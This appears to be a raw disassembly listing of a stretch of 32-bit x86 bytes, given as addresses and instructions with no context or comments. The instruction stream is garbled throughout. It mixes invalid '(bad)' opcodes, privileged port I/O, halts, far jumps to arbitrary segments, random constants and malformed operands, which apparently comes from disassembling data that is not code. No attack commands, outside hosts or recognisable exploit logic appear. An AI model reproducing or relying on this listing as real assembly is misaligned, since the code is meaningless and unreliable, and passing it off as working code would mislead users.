  41e5ef:	mov    edx,0x9b4e6feb
  41e5f4:	dec    edx
  41e5f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5f6:	aad    0x7c
  41e5f8:	in     eax,0x75
  41e5fa:	test   DWORD PTR [esi],0x1415a84f
  41e600:	add    ebp,DWORD PTR [eax]
  41e602:	scas   al,BYTE PTR es:[edi]
  41e603:	pop    ds
  41e604:	imul   ecx,DWORD PTR [ebp+0x35],0x8856699a
  41e60b:	or     BYTE PTR [edi+0x5],0xfe
  41e60f:	fs xor ebp,edx
  41e612:	mov    ecx,0x5978dfe4
  41e617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e618:	ins    BYTE PTR es:[edi],dx
  41e619:	mov    ebp,0x633018a3
  41e61e:	push   cs
  41e61f:	retf   
  41e620:	mov    al,ds:0x73d158f2
  41e625:	inc    eax
  41e626:	push   edx
  41e627:	rol    DWORD PTR [eax-0x63f32a4f],cl
  41e62d:	xchg   edx,eax
  41e62e:	sti    
  41e62f:	out    dx,eax
  41e630:	(bad)  
  41e631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e632:	pop    eax
  41e633:	sub    cl,dh
  41e635:	popf   
  41e636:	push   edx
  41e637:	xor    eax,0x3cc69c9b
  41e63c:	push   0x8ce40def
  41e641:	fldcw  WORD PTR [ebx]
  41e643:	xor    DWORD PTR [edi+0x1864a854],ebp
  41e649:	inc    ebp
  41e64a:	(bad)  
  41e64b:	into   
  41e64c:	outs   dx,DWORD PTR ds:[esi]
  41e64d:	pop    ebx
  41e64e:	std    
  41e64f:	scas   al,BYTE PTR es:[edi]
  41e650:	ins    DWORD PTR es:[edi],dx
  41e651:	std    
  41e652:	adc    ebx,ecx
  41e654:	cdq    
  41e655:	and    al,dh
  41e657:	(bad)  
  41e658:	fwait
  41e659:	or     BYTE PTR [ebp-0x2d],dl
  41e65c:	rcl    DWORD PTR [ebx],0xc3
  41e65f:	jb     0x41e611
  41e661:	or     dl,BYTE PTR fs:[ebx]
  41e664:	test   BYTE PTR [eax-0x6c],0x93
  41e668:	stos   BYTE PTR es:[edi],al
  41e669:	sbb    BYTE PTR [edi-0x5a],0xcf
  41e66d:	sbb    cl,BYTE PTR [ebx]
  41e66f:	inc    ebp
  41e670:	je     0x41e64f
  41e672:	(bad)  
  41e673:	cmp    ebp,ecx
  41e675:	inc    edi
  41e676:	mov    edi,0x731a203e
  41e67b:	and    ebx,DWORD PTR [eax+0x67da4d45]
  41e681:	arpl   si,si
  41e683:	xchg   DWORD PTR [eax+0x32],ebp
  41e686:	mov    ch,BYTE PTR [ecx-0x12]
  41e689:	push   es
  41e68a:	xchg   ecx,eax
  41e68b:	or     eax,0xf1e19154
  41e690:	(bad)  
  41e691:	cwde   
  41e692:	pop    ss
  41e693:	cs fwait
  41e695:	xchg   esp,eax
  41e696:	push   0x2ef04874
  41e69b:	(bad)  
  41e69c:	adc    eax,0x6ad97b7c
  41e6a1:	pop    ebx
  41e6a2:	sbb    bh,BYTE PTR [edi-0x2f]
  41e6a5:	jp     0x41e6e5
  41e6a7:	jge    0x41e62e
  41e6a9:	mov    esp,0x64e896a1
  41e6ae:	push   0xe15e3160
  41e6b3:	adc    cl,BYTE PTR [esi+0x66]
  41e6b6:	out    dx,eax
  41e6b7:	das    
  41e6b8:	sub    eax,0x1651f07f
  41e6bd:	rcl    DWORD PTR [edi+eax*4],cl
  41e6c0:	(bad)  
  41e6c1:	hlt    
  41e6c2:	push   es
  41e6c3:	test   dh,dl
  41e6c5:	sub    BYTE PTR [edx-0x7c],dh
  41e6c8:	lds    edx,FWORD PTR [ebx]
  41e6ca:	or     cx,0xffc4
  41e6ce:	cmc    
  41e6cf:	jo     0x41e678
  41e6d1:	scas   al,BYTE PTR es:[edi]
  41e6d2:	jb     0x41e6a8
  41e6d4:	jbe    0x41e73a
  41e6d6:	sbb    DWORD PTR [eax-0x75],esp
  41e6d9:	cdq    
  41e6da:	cmp    ecx,DWORD PTR [ebx-0x7c]
  41e6dd:	and    eax,0x36b73b4e
  41e6e2:	rcr    DWORD PTR [edx],cl
  41e6e4:	sub    bh,dl
  41e6e6:	scas   al,BYTE PTR es:[edi]
  41e6e7:	mov    bl,0xf0
  41e6e9:	or     al,0x51
  41e6eb:	mov    ch,0xf
  41e6ed:	imul   eax,DWORD PTR [esi-0x3f],0x2a
  41e6f1:	push   edx
  41e6f2:	sub    eax,0x393f4b98
  41e6f7:	xchg   ecx,eax
  41e6f8:	out    dx,eax
  41e6f9:	ins    BYTE PTR es:[edi],dx
  41e6fa:	jecxz  0x41e6f4
  41e6fc:	jo     0x41e709
  41e6fe:	adc    DWORD PTR [ebx+edx*4+0x635fd6d2],edx
  41e705:	aam    0xfb
  41e707:	out    0x62,al
  41e709:	aam    0x9e
  41e70b:	mov    dl,BYTE PTR [esi]
  41e70d:	(bad)  
  41e70e:	mov    ecx,0x6dd0676f
  41e713:	xor    DWORD PTR [ebp+0x2b],esi
  41e716:	stos   BYTE PTR es:[edi],al
  41e717:	mov    bl,BYTE PTR [ecx+0x45]
  41e71a:	push   ss
  41e71b:	or     bl,bl
  41e71d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e71e:	dec    edi
  41e71f:	mov    bh,0x71
  41e721:	fisubr DWORD PTR [edx-0x60a8f456]
  41e727:	in     al,dx
  41e728:	int    0x81
  41e72a:	test   eax,0x70264a8e
  41e72f:	mov    bh,BYTE PTR [ebx+0x23de1fce]
  41e735:	mov    ebx,0x6d6c451a
  41e73a:	and    ch,BYTE PTR [edx+eiz*4-0x4130dd3a]
  41e741:	or     al,0x6a
  41e743:	add    al,0x7d
  41e745:	icebp  
  41e746:	pop    ebx
  41e747:	sub    al,0x3e
  41e749:	pop    esi
  41e74a:	js     0x41e751
  41e74c:	xor    ebx,DWORD PTR [eax-0x34]
  41e74f:	xchg   ebx,eax
  41e750:	stos   BYTE PTR es:[edi],al
  41e751:	lock push ss
  41e753:	push   edx
  41e754:	sub    al,cl
  41e756:	push   ebp
  41e757:	les    ecx,FWORD PTR [ebx+0x6288d5de]
  41e75d:	arpl   WORD PTR [ebp-0x3f47c34f],si
  41e763:	xor    BYTE PTR [eax-0x78],cl
  41e766:	fstp   st(2)
  41e768:	xor    eax,0xe91ae612
  41e76d:	retf   0x8e66
  41e770:	jae    0x41e734
  41e772:	push   0xffffff9a
  41e774:	shl    BYTE PTR [edx],cl
  41e776:	dec    esp
  41e777:	add    cl,BYTE PTR [ebx+0x11fa02dc]
  41e77d:	in     al,dx
  41e77e:	fst    DWORD PTR [ebp-0x9]
  41e781:	loope  0x41e7b4
  41e783:	pop    ds
  41e784:	xlat   BYTE PTR ds:[ebx]
  41e785:	dec    ebx
  41e786:	push   0x692c79db
  41e78b:	sar    DWORD PTR [esi],1
  41e78d:	out    dx,al
  41e78e:	cmp    dl,BYTE PTR [esi+0xc]
  41e791:	adc    dh,BYTE PTR [ebp+0x52470edb]
  41e797:	pop    ds
  41e798:	test   BYTE PTR [esp+edi*1+0x73cdea25],al
  41e79f:	lds    esi,FWORD PTR [esi]
  41e7a1:	add    eax,0x27c52b6e
  41e7a6:	xlat   BYTE PTR ds:[ebx]
  41e7a7:	inc    ebx
  41e7a8:	or     bh,BYTE PTR [ebp-0x3912d67f]
  41e7ae:	jae    0x41e75a
  41e7b0:	aam    0x7a
  41e7b2:	add    al,0x18
  41e7b4:	sbb    DWORD PTR [eax+0x1b],esi
  41e7b7:	pop    ebx
  41e7b8:	loopne 0x41e7c9
  41e7ba:	(bad)  
  41e7bc:	lea    ebp,[ebp-0x7bdc16d4]
  41e7c2:	loopne 0x41e7d3
  41e7c4:	jae    0x41e7a8
  41e7c6:	sub    ax,sp
  41e7c9:	dec    ebx
  41e7ca:	inc    ebx
  41e7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7cc:	cwde   
  41e7cd:	lock add BYTE PTR [eax-0x17344509],al
  41e7d4:	or     BYTE PTR [edi],dl
  41e7d6:	stos   BYTE PTR es:[edi],al
  41e7d7:	lock pushf 
  41e7d9:	jnp    0x41e762
  41e7db:	(bad)  
  41e7dc:	loopne 0x41e7d9
  41e7de:	mov    bh,BYTE PTR ds:0xd950f11
  41e7e4:	test   DWORD PTR [esp+esi*4],esi
  41e7e7:	mov    WORD PTR [edx],?
  41e7e9:	arpl   WORD PTR [edi+0x78],bp
  41e7ec:	ret    0xc0cb
  41e7ef:	fwait
  41e7f0:	test   BYTE PTR [esi],bh
  41e7f2:	push   ss
  41e7f3:	inc    esi
  41e7f4:	mov    esi,0xbcb5631e
  41e7f9:	sub    ecx,DWORD PTR [eax]
  41e7fb:	push   esp
  41e7fc:	mov    esi,0x8d9c222f
  41e801:	(bad)  
  41e802:	mov    dl,al
  41e804:	mov    dl,0x4c
  41e806:	xchg   esp,eax
  41e807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e808:	fidiv  DWORD PTR [eax]
  41e80a:	scas   eax,DWORD PTR es:[edi]
  41e80b:	dec    DWORD PTR [edi-0x1b97f05c]
  41e811:	adc    dl,BYTE PTR [edi-0xf4d6de7]
  41e817:	je     0x41e7d7
  41e819:	jo     0x41e7ba
  41e81b:	hlt    
  41e81c:	(bad)  
  41e81d:	aad    0xbc
  41e81f:	fimul  DWORD PTR [esi-0x52f874cd]
  41e825:	add    al,0x7
  41e827:	rcl    BYTE PTR [eax+0x4ebfd79b],1
  41e82d:	xchg   edi,eax
  41e82e:	(bad)  
  41e82f:	bound  ebp,QWORD PTR [esi]
  41e831:	test   DWORD PTR [edi],edx
  41e833:	jl     0x41e881
  41e835:	popa   
  41e836:	sti    
  41e837:	push   ebx
  41e838:	in     eax,0xd3
  41e83a:	sahf   
  41e83b:	shl    DWORD PTR [ecx*8+0x6d6ed1a4],1
  41e842:	cmp    bh,BYTE PTR [ecx+0x1e07e848]
  41e848:	inc    edi
  41e849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e84b:	in     eax,0xc6
  41e84d:	xor    eax,0x198c6629
  41e852:	sub    DWORD PTR [ebp+edx*1+0x338f55f6],edx
  41e859:	(bad)  
  41e85a:	repnz or BYTE PTR [eax],0x6b
  41e85e:	mov    esp,0x17e952b6
  41e863:	xor    dh,cl
  41e865:	push   esi
  41e866:	test   eax,0xba8d5156
  41e86b:	mov    esi,0xa2540d5a
  41e870:	inc    esi
  41e871:	not    ebx
  41e873:	push   ss
  41e874:	ss aas 
  41e876:	jns    0x41e89a
  41e878:	sub    ebp,DWORD PTR [ebx]
  41e87a:	loop   0x41e86f
  41e87c:	outs   dx,BYTE PTR ds:[esi]
  41e87d:	out    dx,al
  41e87e:	push   ecx
  41e87f:	std    
  41e880:	in     eax,dx
  41e881:	dec    ebp
  41e882:	adc    dl,BYTE PTR [esi+0x14]
  41e885:	inc    eax
  41e886:	sar    ebx,1
  41e888:	adc    edx,DWORD PTR [eax]
  41e88a:	mov    ah,0xc9
  41e88c:	inc    eax
  41e88d:	es (bad) 
  41e88f:	xchg   edi,eax
  41e890:	xlat   BYTE PTR ds:[ebx]
  41e891:	mov    ebp,DWORD PTR [esi-0x18]
  41e894:	fisttp DWORD PTR [edi]
  41e896:	push   edi
  41e897:	xor    DWORD PTR [eax-0x4e],0xb550261c
  41e89e:	cmp    edi,ebp
  41e8a0:	call   0x75c:0xdd6436dd
  41e8a7:	es jae 0x41e8d8
  41e8aa:	in     eax,dx
  41e8ab:	imul   edx,DWORD PTR [ebx+0x61],0xa519c044
  41e8b2:	addr16 and al,0x24
  41e8b5:	push   edi
  41e8b6:	jmp    0x7c56b799
  41e8bb:	repnz mov ecx,0xd412d366
  41e8c1:	push   0xffffff8e
  41e8c3:	in     eax,0xc8
  41e8c5:	sbb    BYTE PTR [ebx],dh
  41e8c7:	inc    eax
  41e8c8:	sar    ebp,cl
  41e8ca:	sbb    BYTE PTR [eax+ebx*2],0xb2
  41e8ce:	inc    edx
  41e8cf:	inc    esp
  41e8d0:	jns    0x41e8c6
  41e8d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8d3:	dec    ebx
  41e8d4:	das    
  41e8d5:	(bad)  
  41e8d6:	pop    ecx
  41e8d7:	push   eax
  41e8d8:	add    BYTE PTR [ebp+0x218b9229],dh
  41e8de:	add    al,0x72
  41e8e0:	push   eax
  41e8e1:	clc    
  41e8e2:	mov    al,ds:0x33ba8edb
  41e8e7:	jecxz  0x41e876
  41e8e9:	shr    DWORD PTR [esi-0x1d],0x1a
  41e8ed:	fxtract 
  41e8ef:	js     0x41e8a7
  41e8f1:	(bad)  
  41e8f3:	call   FWORD PTR [esi+0x7d]
  41e8f6:	jmp    0x700:0x62d6a0c6
  41e8fd:	jo     0x41e912
  41e8ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e900:	mov    ch,0xb4
  41e902:	enter  0xc405,0xc1
  41e906:	mov    bh,0x94
  41e908:	mov    al,ds:0x9f5206d1
  41e90d:	cdq    
  41e90e:	jno    0x41e8d0
  41e910:	(bad)  
  41e911:	xchg   esi,eax
  41e912:	imul   eax,DWORD PTR [esi+0x71],0xffffffc5
  41e916:	mov    dl,BYTE PTR [edx+0xb]
  41e919:	enter  0x2375,0x23
  41e91d:	xchg   esp,eax
  41e91e:	clc    
  41e91f:	sub    BYTE PTR [edx],ch
  41e921:	rol    DWORD PTR [ebx-0x245a3ab2],cl
  41e927:	fisttp QWORD PTR [edx]
  41e929:	lods   eax,DWORD PTR ds:[esi]
  41e92a:	or     esp,DWORD PTR [ebp-0x4d]
  41e92d:	int3   
  41e92e:	jns    0x41e90d
  41e930:	dec    ebx
  41e931:	aam    0x95
  41e933:	mov    bl,BYTE PTR [ebx-0x3a]
  41e936:	xor    eax,0xb56ca25
  41e93b:	(bad)  
  41e93d:	(bad)  
  41e93e:	push   0x7463db15
  41e943:	loop   0x41e941
  41e945:	fidivr DWORD PTR [esi]
  41e947:	icebp  
  41e948:	xchg   ebp,eax
  41e949:	add    ah,BYTE PTR [ebx+0x5a]
  41e94c:	int3   
  41e94d:	(bad)  
  41e94e:	pop    esi
  41e94f:	enter  0x3bca,0x9
  41e953:	in     eax,0x1c
  41e955:	jp     0x41e96f
  41e957:	push   0x1d1bcf88
  41e95c:	lods   eax,DWORD PTR ds:[esi]
  41e95d:	fdiv   DWORD PTR [ecx-0x1a]
  41e960:	dec    edi
  41e961:	fwait
  41e962:	cmp    BYTE PTR [ecx],bl
  41e964:	push   esi
  41e965:	xchg   edx,eax
  41e966:	fbld   TBYTE PTR [ecx+esi*2-0x2a]
  41e96a:	push   esp
  41e96b:	fldcw  WORD PTR [edx]
  41e96d:	mov    edi,0xb5aeb346
  41e972:	mov    ebp,0x91e48a17
  41e977:	adc    al,0x54
  41e979:	sbb    DWORD PTR [ecx-0x5a],edx
  41e97c:	pop    eax
  41e97d:	cs addr16 loop 0x41e96a
  41e981:	or     bh,bl
  41e983:	stos   BYTE PTR es:[edi],al
  41e984:	cmp    eax,0x2a8029bf
  41e989:	xchg   edi,eax
  41e98a:	icebp  
  41e98b:	xchg   ecx,eax
  41e98c:	imul   esp,DWORD PTR [edx-0x539eeffe],0x35
  41e993:	xchg   esp,eax
  41e994:	dec    ebx
  41e995:	sub    DWORD PTR ds:0x469f65c,edi
  41e99b:	out    dx,eax
  41e99c:	pop    edx
  41e99d:	cs in  eax,dx
  41e99f:	out    0x67,eax
  41e9a1:	loop   0x41ea0b
  41e9a3:	push   ss
  41e9a4:	pop    esi
  41e9a5:	inc    esp
  41e9a6:	int    0xe7
  41e9a8:	xor    ch,BYTE PTR [esi+0x49ac0700]
  41e9ae:	les    ebp,FWORD PTR [esi-0x4]
  41e9b1:	mov    ch,0x7d
  41e9b3:	cwde   
  41e9b4:	fild   QWORD PTR [edi-0x5561e417]
  41e9ba:	mov    eax,ds:0x1ea9f917
  41e9bf:	je     0x41e9e6
  41e9c1:	dec    edx
  41e9c2:	jno    0x41e9b7
  41e9c4:	mov    BYTE PTR [esi-0x7f],0xd2
  41e9c8:	add    esp,eax
  41e9ca:	scas   eax,DWORD PTR es:[edi]
  41e9cb:	inc    edi
  41e9cc:	std    
  41e9cd:	ror    BYTE PTR [ebx+0x49],1
  41e9d0:	sbb    DWORD PTR [esi-0x5d54b178],edi
  41e9d6:	imul   ebx,DWORD PTR [esi+0x11506825],0xf
  41e9dd:	inc    esp
  41e9de:	or     bl,ah
  41e9e0:	into   
  41e9e1:	sbb    eax,0x2dc8bd39
  41e9e6:	test   DWORD PTR [eax],0xcb2452ac
  41e9ec:	cmp    al,ah
  41e9ee:	out    0xaf,al
  41e9f0:	xchg   bh,dl
  41e9f2:	es nop
  41e9f4:	pusha  
  41e9f5:	lock xor eax,0x55bbd7e6
  41e9fb:	lock icebp 
  41e9fd:	mov    bl,0xe4
  41e9ff:	inc    esp
  41ea00:	sbb    eax,0x19f9e356
  41ea05:	fwait
  41ea06:	adc    edx,DWORD PTR [eax]
  41ea08:	pusha  
  41ea09:	ds jecxz 0x41ea77
  41ea0c:	out    0xb9,eax
  41ea0e:	out    dx,eax
  41ea0f:	mov    dh,0xed
  41ea11:	inc    edx
  41ea12:	stc    
  41ea13:	int3   
  41ea14:	cmp    al,0x5e
  41ea16:	jg     0x41ea90
  41ea18:	lea    eax,[eax+eax*8]
  41ea1b:	jle    0x41ea7a
  41ea1d:	retf   
  41ea1e:	data16 adc BYTE PTR [ecx-0x58d0e16d],bh
  41ea25:	inc    ebx
  41ea26:	shl    BYTE PTR [ecx+0x27136960],1
  41ea2c:	test   ch,dh
  41ea2e:	repnz cmp edi,DWORD PTR [eax+edi*2+0x44ed225e]
  41ea36:	cmp    ch,dl
  41ea38:	lahf   
  41ea39:	cmc    
  41ea3a:	jecxz  0x41ea33
  41ea3c:	ror    DWORD PTR [eax-0x421b3aaa],cl
  41ea42:	xor    DWORD PTR [ecx+esi*4-0x2a3acc0c],0x80d79a79
  41ea4d:	iret   
  41ea4e:	dec    ecx
  41ea4f:	xor    DWORD PTR [ebx+0x25],ebp
  41ea52:	div    BYTE PTR [edx-0x638e4c1]
  41ea58:	in     eax,dx
  41ea59:	jl     0x41ea6e
  41ea5b:	push   0xffffffc6
  41ea5d:	cmp    al,0x9a
  41ea5f:	into   
  41ea60:	jle    0x41eabc
  41ea62:	out    dx,eax
  41ea63:	mov    DWORD PTR [ebx+0x3bdc19be],esi
  41ea69:	test   BYTE PTR [esi],0x32
  41ea6c:	jb     0x41ea72
  41ea6e:	push   ecx
  41ea6f:	push   ecx
  41ea70:	lock add bh,BYTE PTR [ebx+0xe]
  41ea74:	sbb    esi,ebp
  41ea76:	mov    dl,0x26
  41ea78:	mov    ds:0x6cc8cf81,al
  41ea7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea7e:	sbb    eax,0x66ddfa52
  41ea83:	cdq    
  41ea84:	mov    bl,0x68
  41ea86:	ss xchg ebx,eax
  41ea88:	je     0x41eaf5
  41ea8a:	or     al,0xd9
  41ea8c:	inc    esi
  41ea8d:	repnz mov al,ds:0x9de4e8d
  41ea93:	jp     0x41ea6e
  41ea95:	mov    ebx,DWORD PTR [esi-0x12]
  41ea98:	jecxz  0x41ea7c
  41ea9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea9b:	enter  0x12b1,0x2
  41ea9f:	jno    0x41eaa1
  41eaa1:	gs div esi
  41eaa4:	out    0xcb,eax
  41eaa6:	jns    0x41ead7
  41eaa8:	xor    dh,BYTE PTR [edi-0x47]
  41eaab:	aam    0x2d
  41eaad:	and    bh,BYTE PTR [edx+ecx*4+0x65]
  41eab1:	cmp    bl,dh
  41eab3:	inc    ecx
  41eab4:	int    0xbe
  41eab6:	xor    bh,bl
  41eab8:	cmc    
  41eab9:	sub    eax,0xf06d3860
  41eabe:	and    al,0xee
  41eac0:	jbe    0x41eb3f
  41eac2:	push   ebp
  41eac3:	adc    ebx,esp
  41eac5:	imul   si,WORD PTR [ebp-0x72244548],0x6e
  41eacd:	sub    eax,0x138cba2f
  41ead2:	sub    dh,dl
  41ead4:	mov    esi,0xbd02bbf5
  41ead9:	and    al,0x17
  41eadb:	dec    edx
  41eadc:	sub    al,0xc0
  41eade:	or     dh,bl
  41eae0:	push   0xb662487b
  41eae5:	retf   
  41eae6:	jle    0x41eb61
  41eae8:	push   esp
  41eae9:	mov    ecx,0xe563aaf2
  41eaee:	addr16 aas 
  41eaf0:	mov    gs:0x40bf4b22,eax
  41eaf6:	push   esp
  41eaf7:	(bad)  
  41eaf9:	mov    ?,WORD PTR [ecx+eiz*1]
  41eafc:	(bad)  
  41eafe:	popa   
  41eaff:	mov    ch,0xce
  41eb01:	inc    esi
  41eb02:	lods   eax,DWORD PTR ds:[esi]
  41eb03:	fcomp  DWORD PTR [esi-0x32]
  41eb06:	xor    edx,DWORD PTR [ecx+0x3fc890bc]
  41eb0c:	add    eax,0x4aba3696
  41eb11:	mov    bl,0x38
  41eb13:	repz sti 
  41eb15:	xor    al,0x68
  41eb17:	sbb    DWORD PTR [ecx-0x28c8e62f],esi
  41eb1d:	push   es
  41eb1e:	inc    edi
  41eb1f:	in     al,dx
  41eb20:	mov    dl,0x36
  41eb22:	stos   DWORD PTR es:[edi],eax
  41eb23:	mov    ds:0xbcf9ebd7,eax
  41eb28:	jns    0x41eb63
  41eb2a:	push   eax
  41eb2b:	mov    bh,0x53
  41eb2d:	mov    ds:0x647ec32,eax
  41eb32:	jae    0x41eb9d
  41eb34:	mov    dh,0xe1
  41eb36:	mov    edi,0x5ee373d2
  41eb3b:	stos   BYTE PTR es:[edi],al
  41eb3c:	retf   
  41eb3d:	leave  
  41eb3e:	sar    DWORD PTR [ecx+0x4e],cl
  41eb41:	popf   
  41eb42:	mov    WORD PTR [eax],ds
  41eb44:	adc    esp,DWORD PTR [esi+0x2e]
  41eb47:	or     ecx,DWORD PTR [ebx-0x55]
  41eb4a:	stc    
  41eb4b:	sbb    bh,BYTE PTR [eax+eax*8-0x64]
  41eb4f:	pop    ds
  41eb50:	int    0x2c
  41eb52:	cld    
  41eb53:	sub    BYTE PTR [esi-0x3810a081],bl
  41eb59:	inc    ecx
  41eb5a:	pop    esp
  41eb5b:	aad    0x4f
  41eb5d:	pop    ss
  41eb5e:	ret    
  41eb5f:	xor    ebx,DWORD PTR [ebp+ebx*8+0x3d]
  41eb63:	cmp    eax,0xf75a731e
  41eb68:	xor    al,0xfd
  41eb6a:	mov    edi,0x840c5304
  41eb6f:	hlt    
  41eb70:	fs inc edi
  41eb72:	sti    
  41eb73:	out    dx,eax
  41eb74:	dec    edx
  41eb75:	mov    esi,0x72f15c4f
  41eb7a:	out    dx,eax
  41eb7b:	sub    bh,0x31
  41eb7e:	pop    ds
  41eb7f:	in     eax,0x2e
  41eb81:	xor    eax,0x1ebc6733
  41eb86:	or     BYTE PTR [ecx],0xfa
  41eb89:	mov    al,0x7
  41eb8b:	aaa    
  41eb8c:	cmp    al,0x50
  41eb8e:	repnz xor eax,0xb275df83
  41eb94:	fist   DWORD PTR [eax-0x154fcfbb]
  41eb9a:	xchg   ecx,eax
  41eb9b:	lock pop ecx
  41eb9d:	jmp    0xbe54:0x4f62fc69
  41eba4:	dec    ebp
  41eba5:	(bad)  
  41eba6:	cmp    ebp,DWORD PTR [ebx-0x1a5331c6]
  41ebac:	mov    DWORD PTR [ebp+0x4a],ebx
  41ebaf:	jne    0x41eb4c
  41ebb1:	(bad)  
  41ebb2:	mov    eax,ds:0x85d6727a
  41ebb7:	data16 loopne 0x41eb4a
  41ebba:	push   ecx
  41ebbb:	cmp    DWORD PTR [eax+eax*2],ebx
  41ebbe:	daa    
  41ebbf:	sbb    ah,dl
  41ebc1:	xlat   BYTE PTR ds:[ebx]
  41ebc2:	push   ebx
  41ebc3:	pop    ss
  41ebc4:	addr16 mov edx,0x9d9342cd
  41ebca:	fcomip st,st(1)
  41ebcc:	push   cs
  41ebcd:	fild   WORD PTR [edi]
  41ebcf:	test   BYTE PTR [ecx-0x7f],0x27
  41ebd3:	pop    ecx
  41ebd4:	inc    eax
  41ebd5:	sbb    eax,0x87a62089
  41ebda:	ror    DWORD PTR [esi-0x72be2c21],0x35
  41ebe1:	inc    ebp
  41ebe2:	push   edx
  41ebe3:	clc    
  41ebe4:	cld    
  41ebe5:	sti    
  41ebe6:	push   edx
  41ebe7:	mov    esp,0x64a769bd
  41ebec:	daa    
  41ebed:	(bad)  [edi]
  41ebef:	loop   0x41ec63
  41ebf1:	shl    dl,0x7d
  41ebf4:	sub    DWORD PTR [ebx+edi*1-0x59056dee],0x5a51530c
  41ebff:	sub    al,BYTE PTR [ecx-0x1a606de6]
  41ec05:	mov    BYTE PTR [ebx+ecx*8+0x689bffac],dl
  41ec0c:	dec    ebx
  41ec0d:	loopne 0x41ebf5
  41ec0f:	inc    edx
  41ec10:	sbb    eax,0x2e286760
  41ec15:	jae    0x41ec2d
  41ec17:	jmp    0x41eba7
  41ec19:	sbb    DWORD PTR [ebx],edx
  41ec1b:	fnsave [ecx]
  41ec1d:	fnstcw WORD PTR [esi]
  41ec1f:	mov    al,0x76
  41ec21:	xchg   esi,eax
  41ec22:	xchg   edx,eax
  41ec23:	dec    esi
  41ec24:	push   esi
  41ec25:	xchg   edx,eax
  41ec26:	xchg   ebp,eax
  41ec27:	add    eax,0xd551146c
  41ec2c:	out    dx,eax
  41ec2d:	lods   eax,DWORD PTR ds:[esi]
  41ec2e:	jae    0x41ec3c
  41ec30:	jo     0x41ebe0
  41ec32:	mov    ds:0x324fda76,al
  41ec37:	mov    edi,DWORD PTR [ebp+0x25ffc575]
  41ec3d:	dec    esp
  41ec3e:	or     BYTE PTR [ecx],bh
  41ec40:	mov    DWORD PTR [esi-0x7b186f56],ebp
  41ec46:	inc    esi
  41ec47:	loope  0x41ebe8
  41ec49:	push   ds
  41ec4a:	sub    al,0x35
  41ec4c:	dec    ebp
  41ec4d:	pop    es
  41ec4e:	cs pusha 
  41ec50:	add    dh,BYTE PTR [ecx+0x37]
  41ec53:	scas   al,BYTE PTR es:[edi]
  41ec54:	sbb    al,0x87
  41ec56:	push   ds
  41ec57:	in     eax,dx
  41ec58:	or     eax,0xd7fb38a8
  41ec5d:	lahf   
  41ec5e:	fcom   DWORD PTR [edi-0x1a71c3df]
  41ec64:	retf   
  41ec65:	dec    eax
  41ec66:	mov    ds:0xccb85217,eax
  41ec6b:	dec    ecx
  41ec6c:	lahf   
  41ec6d:	sub    ebp,ebx
  41ec6f:	add    BYTE PTR [eax+0x22],dh
  41ec72:	xchg   ebp,eax
  41ec73:	scas   al,BYTE PTR es:[edi]
  41ec74:	dec    esp
  41ec75:	jmp    0x41eca8
  41ec77:	stos   DWORD PTR es:[edi],eax
  41ec78:	loope  0x41ecf7
  41ec7a:	test   eax,0x81a38cf5
  41ec7f:	scas   al,BYTE PTR es:[edi]
  41ec80:	js     0x41ecfc
  41ec82:	mov    al,0x97
  41ec84:	imul   al
  41ec86:	mov    edx,0xe054f3d
  41ec8b:	jmp    0xc658:0x3e2516dc
  41ec92:	out    dx,al
  41ec93:	dec    edi
  41ec94:	jbe    0x41ec9c
  41ec96:	popa   
  41ec97:	xor    eax,0x29efb6b3
  41ec9c:	sub    esp,DWORD PTR [eax-0x746ad66]
  41eca2:	mov    DWORD PTR [ebx+eax*2-0x2b],edi
  41eca6:	cwde   
  41eca7:	push   eax
  41eca8:	jne    0x41ec42
  41ecaa:	inc    esi
  41ecab:	mov    esp,0x543ddb9e
  41ecb0:	sbb    eax,0xa956cafc
  41ecb5:	mov    ah,0x4d
  41ecb7:	aad    0x54
  41ecb9:	mov    al,0x56
  41ecbb:	pop    es
  41ecbc:	or     BYTE PTR [edx-0xb],dh
  41ecbf:	mov    bl,0x7
  41ecc1:	mov    ch,al
  41ecc3:	dec    eax
  41ecc4:	shl    dl,1
  41ecc6:	fistp  DWORD PTR [eax+0xa36adf5]
  41eccc:	dec    edi
  41eccd:	push   eax
  41ecce:	mov    dl,0xd1
  41ecd0:	inc    edx
  41ecd1:	xchg   ebp,eax
  41ecd2:	arpl   WORD PTR [edx-0x1f1e1dac],si
  41ecd8:	inc    edx
  41ecd9:	jmp    0x33d19a9e
  41ecde:	aaa    
  41ecdf:	iret   
  41ece0:	ins    BYTE PTR es:[edi],dx
  41ece1:	ret    0xb56a
  41ece4:	imul   esi,esi,0x686df5b5
  41ecea:	test   BYTE PTR [ebx-0x30473b1d],0x6d
  41ecf1:	stos   DWORD PTR es:[edi],eax
  41ecf2:	lods   eax,DWORD PTR ds:[esi]
  41ecf3:	outs   dx,DWORD PTR ds:[esi]
  41ecf4:	mov    ebx,0x2a3380d5
  41ecf9:	pop    eax
  41ecfa:	loope  0x41ed11
  41ecfc:	sub    al,0xcc
  41ecfe:	mov    dh,0x3a
  41ed00:	stc    
  41ed01:	ins    BYTE PTR es:[edi],dx
  41ed02:	pop    es
  41ed03:	lods   eax,DWORD PTR ds:[esi]
  41ed04:	or     BYTE PTR [edx+0x69],al
  41ed07:	cmp    BYTE PTR [ebp+0x53e9a40],bh
  41ed0d:	sbb    ebx,DWORD PTR [ebx-0x43]
  41ed10:	push   ds
  41ed11:	aas    
  41ed12:	mov    esp,0x3363f5fb
  41ed17:	mov    ebx,0x4cb5a5d9
  41ed1c:	(bad)  
  41ed1d:	leave  
  41ed1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed1f:	xlat   BYTE PTR ds:[ebx]
  41ed20:	xchg   ebp,eax
  41ed21:	aaa    
  41ed22:	pop    eax
  41ed23:	jge    0x41ed3e
  41ed25:	push   0xffffffcb
  41ed27:	inc    esi
